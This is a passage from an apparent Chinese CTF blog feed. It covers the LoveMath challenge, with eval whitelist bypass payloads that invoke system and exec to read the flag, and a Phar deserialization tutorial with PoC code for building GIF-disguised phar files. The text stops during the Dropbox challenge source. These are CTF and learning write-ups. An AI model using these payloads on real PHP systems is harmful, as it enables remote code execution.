&#39;.$content.&#39;;&#39;);&#125;</code></pre><p>代码审计限制条件</p><ul><li>传入的<code>c</code>的字符串长度大小不能大于80</li><li>传入的字符串不能包含<code>&#39; &#39;</code>, <code>&#39;\t&#39;</code>, <code>&#39;\r&#39;</code>, <code>&#39;\n&#39;</code>,<code>&#39;\&#39;&#39;</code>, <code>&#39;&quot;&#39;</code>, <code>&#39;``&#39;</code>, <code>&#39;\[&#39;</code>, <code>&#39;\]&#39;</code></li><li><code>preg_match_all</code>将匹配到的结果传给<code>$used_funcs</code>，<code>$used_funcs</code>只能是<code>$whitelist</code>中的函数，意识就是传入的字符串中的词组也只能是<code>$whitelist</code>中的单词</li></ul><p>以上条件满足后即可传入<code>eval</code>中执行代码</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;$pi&#x3D;base_convert(3761671484,13,36)(dechex(1598506324));($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)&amp;1&#x3D;system&amp;2&#x3D;tac &#x2F;flag</code></pre><p>分析：</p><ul><li><code>base_convert</code>函数的功能是在任意进制的字符串之间转换数字<code>base_convert(37907361743,10,36)  ==&gt;  hex2bin</code></li><li><code>dechex(1598506324)  ==&gt;  5f474554</code>，<code>hex2bin(&quot;5f474554&quot;)  ==&gt;  _GET</code></li><li>选用<code>pi</code>的原因是因为题目有长度限制，白名单中最短的就是这两个字符<code>pi</code>，故选它</li><li>当<code>$pi</code>=<code>_GET</code>之后再在前面加一个<code>$</code>就形成了<code>$_GET</code></li><li><code>($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)</code>翻译过来就是<code>($_GET)&#123;1&#125;(($_GET)&#123;2&#125;) === $_GET[1]($_GET[2])</code>，传入<code>1=system</code>即可进行命令执行</li></ul><p>举一反三，那么我们改如何构造出这种方法呢？<code>base_convert</code>的进制转换不知道的话又怎么知道该传入什么数字和进制呢？于是写出构造脚本：</p><p><code>base_convert</code>函数构造：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$a &#x3D; &#39;hex2bin&#39;;for($i &#x3D; 2; $i &lt; 37; $i++)&#123;    for($j &#x3D; 2; $j &lt; 37; $j++)&#123;        if(is_numeric(base_convert($a, $i, $j)))&#123;            if(base_convert(base_convert($a, $i, $j), $j, $i) &#x3D;&#x3D;&#x3D; $a)&#123;                echo &#39;len&#x3D;&#39;.strlen(base_convert($a, $i, $j)).&#39; &#39;.&#39;base_convert参数-&gt;&#39;.base_convert($a, $i, $j).&#39; &#39;.$j.&#39; &#39;.$i.&#39; &#39;.&quot;\n&quot;;            &#125;        &#125;    &#125;&#125;?&gt;</code></pre><p>这样即可得到所有的进制转换结果，当然如果题目没有引号限制，<code>is_numeric</code>函数也可以去掉，在里面选取所需要的即可</p><p>那么<code>dechex</code>如何构造呢？这个就简单了，两行代码就可以搞定</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$a &#x3D; &quot;_GET&quot;;$num &#x3D; hexdec(bin2hex($a));echo $num . &quot;\n&quot;;echo (base_convert(3761671484,13,36)(dechex($num)));?&gt;</code></pre><p>输出的结果既是可传入的值</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;$pi&#x3D;base_convert,$pi(47138,20,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code></pre><p>分析：</p><ul><li><code>base_convert(47138,20,36)  ==&gt;  exec</code>，exec执行一个外部程序，返回最后一行内容</li><li><code>base_convert(8768397090111664438,10,30)  ==&gt;   getallheaders</code>，获取全部 HTTP 请求头信息</li><li>以上语句翻译下来就是<code>exec(getallheaders()&#123;1&#125;)</code>，可以获取请求头第一个字段的值，<code>[]</code>被waf可以用<code>&#123;&#125;</code>包囊数字来解决代替绕过中括号和引号</li></ul><p>发包即可拿到flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CISCN-LoveMath-php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C/image-20200517213809635.png" alt loading="lazy"></p><p>当然这里直接<code>cat flag</code>也是可以的，如下：</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;($pi&#x3D;base_convert)(47138,20,36)($pi(3761671484,13,36)(dechex(109270211243818)))</code></pre><p>命令执行就是<code>exec(&quot;cat /*&quot;)</code>，可以打印出flag</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>利用异或将字符串转化成我们想要的字符串，例如我们需要<code>$_GET</code>，那么就要获得<code>_GET</code>，FUZZ代码如下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$payload &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;,  &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39; , &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];for($k&#x3D;1;$k&lt;&#x3D;sizeof($payload);$k++)&#123;    for($i &#x3D; 0;$i &lt; 9; $i++)&#123;        for($j &#x3D; 0;$j &lt;&#x3D;9; $j++)&#123;            $exp &#x3D; $payload[$k] ^ ($i.$j);            echo($payload[$k].&quot;^$i$j&quot;.&quot;&#x3D;&#x3D;&gt;$exp&quot;.&quot;\n&quot;);        &#125;    &#125;&#125;</code></pre><p>在打印出的结果中搜寻想要的字符串，找到最短的再组合</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat &#x2F;flag</code></pre><ul><li><code>is_nan^(6).(4)  ==&gt;  _G</code></li><li><code>tan^(1).(5)  ==&gt;  ET</code></li><li>以上就和第一种方法类似，然后在传命令执行的代码就可以了</li></ul><p>参考：</p><ul><li><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">https://www.cnblogs.com/20175211lyz/p/11588219.html</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a></li></ul><p>题目还是挺有意思的，如果再发现新方法再补上</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  先看到题目给出的源码：&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Phar反序列化浅析</title>
    <link href="https://www.extrader.top/posts/bb56c28a/"/>
    <id>https://www.extrader.top/posts/bb56c28a/</id>
    <published>2020-05-04T03:49:35.000Z</published>
    <updated>2020-05-04T03:49:35.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/2958#toc-2">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a></li><li><a href="https://www.freebuf.com/articles/web/205943.html">PHAR反序列化拓展操作总结</a></li><li><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></li></ul><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><p><strong>①</strong>  <strong>a stub</strong></p><p>可以理解为一个标志，格式为<code>xxx</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><p><strong>②</strong>  <strong>a manifest describing the contents</strong></p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的<code>meta-data</code>，这是上述攻击手法最核心的地方。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124151781.png" alt loading="lazy"></p><p><strong>③</strong>  <strong>the file contents</strong></p><p>被压缩文件的内容。</p><p><strong>④</strong>  <strong>a signature for verifying Phar integrity (phar file format only)</strong></p><p>签名，放在文件末尾，格式如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124231445.png" alt loading="lazy"></p><p>通过<code>phar://</code>伪协议对一个<strong>phar</strong>文件进行了文件操作的时候，就可以触发反序列化，达到<strong>RCE</strong>的效果</p><h4 id="产生缘由"><a href="#产生缘由" class="headerlink" title="产生缘由"></a>产生缘由</h4><p>在<a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618">phar.c#L618</a>处，其调用了<code>php_var_unserialize</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120955832.png" alt loading="lazy"></p><p>因此可以构造一个特殊的phar包，使得代码能够反序列化，从而构造一个pop链，在使用<code>phar://</code>协议读取文件的时候，文件会被解析成phar (<a href="https://www.php.net/manual/zh/intro.phar.php">https://www.php.net/manual/zh/intro.phar.php</a>) 的过程会触发<code>php_var_unserialize</code>函数对<strong>meta-data</strong>的操作，造成反序列化。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>条件</strong></p><ul><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ul><p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120506980.png" alt loading="lazy"></p><ul><li><strong>exif</strong>：<code>exif_thumbnail</code>，<code>exif_imagetype</code></li><li><strong>gd</strong>：<code>imageloadfont</code>，<code>imagecreatefrom***</code></li><li><strong>hash</strong>：<code>hash_hmac_file</code>，<code>hash_file</code>，<code>hash_update_file</code>，<code>md5_file</code>，<code>sha1_file</code></li><li><strong>file/url</strong>：<code>get_meta_tags</code>，<code>get_headers</code></li><li><strong>standard</strong>：<code>getimagesize</code>，<code>getimagesizefromstring</code></li></ul><p><strong>zip</strong>：</p><pre class="language-php" data-language="php"><code class="language-php">$zip &#x3D; new ZipArchive();$res &#x3D; $zip-&gt;open(&#39;c.zip&#39;);$zip-&gt;extractTo(&#39;phar:&#x2F;&#x2F;test.phar&#x2F;test&#39;);</code></pre><p>限制<code>phar://</code>不能出现在头几个字符，亦适用于<code>compress.zlib://</code>：</p><pre class="language-php" data-language="php"><code class="language-php">$z &#x3D; &#39;compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;home&#x2F;sx&#x2F;test.phar&#x2F;test.txt&#39;;</code></pre><p><strong><a href="https://baike.baidu.com/item/PostgreSQL/530240?fr=aladdin">PostgreSQL</a></strong>：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$pdo &#x3D; new PDO(sprintf(&quot;pgsql:host&#x3D;%s;dbname&#x3D;%s;user&#x3D;%s;password&#x3D;%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;));@$pdo-&gt;pgsqlCopyFromFile(&#39;aa&#39;, &#39;phar:&#x2F;&#x2F;test.phar&#x2F;aa&#39;);</code></pre><p><code>pgsqlCopyToFile</code>和<code>pg_trace</code>同样能使用的，需要开启<code>phar</code>的写功能。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>生成<strong>phar</strong>文件：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;phar.phar&quot;);    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub    $o &#x3D; new TestObject();    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件    &#x2F;&#x2F;签名自动计算    $phar-&gt;stopBuffering();?&gt;</code></pre><p>notepad打开查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504131930692.png" alt loading="lazy"></p><p>明显的序列化存储</p><p>构造利用代码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php     class TestObject &#123;        public function __destruct() &#123;            echo &#39;Destruct called&#39;;        &#125;    &#125;    $filename &#x3D; &#39;phar:&#x2F;&#x2F;phar.phar&#x2F;a_random_string&#39;;    file_exists($filename);?&gt;</code></pre><p>成功打印结果，当然这里换其他的文件操作函数也可以</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132140672.png" alt loading="lazy"></p><p><strong>将phar伪造成其他格式的文件</strong></p><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;phar.phar&quot;);    $phar &#x3D; new Phar(&quot;phar.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub，增加gif文件头    $o &#x3D; new TestObject();    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件    &#x2F;&#x2F;签名自动计算    $phar-&gt;stopBuffering();?&gt;</code></pre><p>notepad打开查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132602458.png" alt loading="lazy"></p><p>和上面的一样可以利用成功</p><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="CISCN2019-华北赛区-Day1-Web1-—Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-—Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]—Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]—Dropbox</h4><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212154616.png" alt loading="lazy"></p><p>先随便注册一个账号登录，随后发现有上传文件和下载，删除文件的功能</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212308364.png" alt loading="lazy"></p><p>测试文件上传，只能上传那三种图片的格式，应该是有白名单，且文件上传后路径不可知，于是抓包测试文件下载和删除功能，其中文件下载处存在文件下载漏洞，于是将整个网站的源码都下载下来，测试后发现，后台在下载界面还是做了权限限制的，不然根目录下的<code>flag</code>就可以直接下下来了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212700778.png" alt loading="lazy"></p><p>有以下文件：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504213252372.png" alt loading="lazy"></p><p>login.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: index.php&quot;);    die();&#125;?&gt;.........(HTML)&lt;?phpinclude &quot;class.php&quot;;if (isset($_GET[&#39;register&#39;])) &#123;    echo &quot;&lt;script&gt;toast(&#39;注册成功&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;;&#125;if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;    $u &#x3D; new User();    $username &#x3D; (string) $_POST[&quot;username&quot;];    $password &#x3D; (string) $_POST[&quot;password&quot;];    if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;        $_SESSION[&#39;login&#39;] &#x3D; true;        $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username);        $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;;        if (!is_dir($sandbox)) &#123;            mkdir($sandbox);        &#125;        $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox;        echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);        die();    &#125;    echo &quot;&lt;script&gt;toast(&#39;账号或密码错误&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;&#125;?&gt;</code></pre><p>register.php</p><pre class="language-php" data-language="php"><code class="language-php">.........(HTML)&lt;?phpinclude &quot;class.php&quot;;if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;    $u &#x3D; new User();    $username &#x3D; (string) $_POST[&quot;username&quot;];    $password &#x3D; (string) $_POST[&quot;password&quot;];    if (strlen($username) &lt; 20 &amp;&amp; strlen($username) &gt; 2 &amp;&amp; strlen($password) &gt; 1) &#123;        if ($u-&gt;add_user($username, $password)) &#123;            echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;login.php?register&#39;;&lt;&#x2F;script&gt;&quot;);            die();        &#125; else &#123;            echo &quot;&lt;script&gt;toast(&#39;此用户名已被使用&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;            die();        &#125;    &#125;    echo &quot;&lt;script&gt;toast(&#39;请输入有效用户名和密码&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;&#125;?&gt;</code></pre><p>upload.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;include &quot;class.php&quot;;if (isset($_FILES[&quot;file&quot;])) &#123;    $filename &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];    $pos &#x3D; strrpos($filename, &quot;.&quot;);    if ($pos !&#x3D;&#x3D; false) &#123;        $filename &#x3D; substr($filename, 0, $pos);    &#125;    $fileext &#x3D; &quot;.gif&quot;;    switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) &#123;        case &#39;image&#x2F;gif&#39;:            $fileext &#x3D; &quot;.gif&quot;;            break;        case &#39;image&#x2F;jpeg&#39;:            $fileext &#x3D; &quot;.jpg&quot;;            break;        case &#39;image&#x2F;png&#39;:            $fileext &#x3D; &quot;.png&quot;;            break;        default:            $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;Only gif&#x2F;jpg&#x2F;png allowed&quot;);            Header(&quot;Content-type: application&#x2F;json&quot;);            echo json_encode($response);            die();    &#125;    if (strlen($filename) &lt; 40 &amp;&amp; strlen($filename) !&#x3D;&#x3D; 0) &#123;        $dst &#x3D; $_SESSION[&#39;sandbox&#39;] . $filename . $fileext;        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst);        $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);        Header(&quot;Content-type: application&#x2F;json&quot;);        echo json_encode($response);    &#125; else &#123;        $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;Invaild filename&quot;);        Header(&quot;Content-type: application&#x2F;json&quot;);        echo json_encode($response);    &#125;&#125;?&gt;</code></pre><p>download.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);chdir($_SESSION[&#39;sandbox&#39;]);$file &#x3D; new File();$filename &#x3D; (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123;    Header(&quot;Content-type: application&#x2F;octet-stream&quot;);    Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename));    echo $file-&gt;close();&#125; else &#123;    echo &quot;File not exist&quot;;&#125;?&gt;</code></pre><p>delete.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#39;sandbox&#39;]);$file &#x3D; new File();$filename &#x3D; (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;    $file-&gt;detele();    Header(&quot;Content-type: application&#x2F;json&quot;);    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);    echo json_encode($response);&#125; else &#123;    Header(&quot;Content-type: application&#x2F;json&quot;);    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);    echo json_encode($response);&#125;?&gt;</code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$dbaddr &#x3D; &quot;127.0.0.1&quot;;$dbuser &#x3D; &quot;root&quot;;$dbpass &#x3D; &quot;root&quot;;$dbname &#x3D; &quot;dropbox&quot;;$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123;    public $db;    public function __construct() &#123;        global $db;        $this-&gt;db &#x3D; $db;    &#125;    public function user_exist($username) &#123;        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count &#x3D; $stmt-&gt;num_rows;        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;            return false;        &#125;        return true;    &#125;    public function add_user($username, $password) &#123;        if ($this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);        $stmt-&gt;execute();        return true;    &#125;    public function verify_user($username, $password) &#123;        if (!$this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;            return true;        &#125;        return false;    &#125;    public function __destruct() &#123;        $this-&gt;db-&gt;close();    &#125;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct($path) &#123;        $this-&gt;files &#x3D; array();        $this-&gt;results &#x3D; array();        $this-&gt;funcs &#x3D; array();        $filenames &#x3D; scandir($path);        $key &#x3D; array_search(&quot;.&quot;, $filenames);        unset($filenames[$key]);        $key &#x3D; array_search(&quot;..&quot;, $filenames);        unset($filenames[$key]);        foreach ($filenames as $filename) &#123;            $file &#x3D; new File();            $file-&gt;open($path . $filename);            array_push($this-&gt;files, $file);            $this-&gt;results[$file-&gt;name()] &#x3D; array();        &#125;    &#125;    public function __call($func, $args) &#123;        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) &#123;            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();        &#125;    &#125;    public function __destruct() &#123;        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;        foreach ($this-&gt;funcs as $func) &#123;            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;        &#125;        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;            $table .&#x3D; &#39;&lt;tr&gt;&#39;;            foreach ($result as $func &#x3D;&gt; $value) &#123;                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;            &#125;            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;        &#125;        echo $table;    &#125;&#125;class File &#123;    public $filename;    public function open($filename) &#123;        $this-&gt;filename &#x3D; $filename;        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function name() &#123;        return basename($this-&gt;filename);    &#125;    public function size() &#123;        $size &#x3D; filesize($this-&gt;filename);        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;        return round($size, 2).$units[$i];    &#125;    public function detele() &#123;        unlink($this-&gt;filename);    &#125;    public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;&#125;?&gt;</code></pre><p>代码核心就在<code>class.php</code>了</p><p>先看到login和register两个文件，用了PDO，注入相当困难，找到到文件下载功能<code>download</code>，可以看到这样的一句代码：<code>ini_set(&quot;open_basedir&quot;, getcwd() . 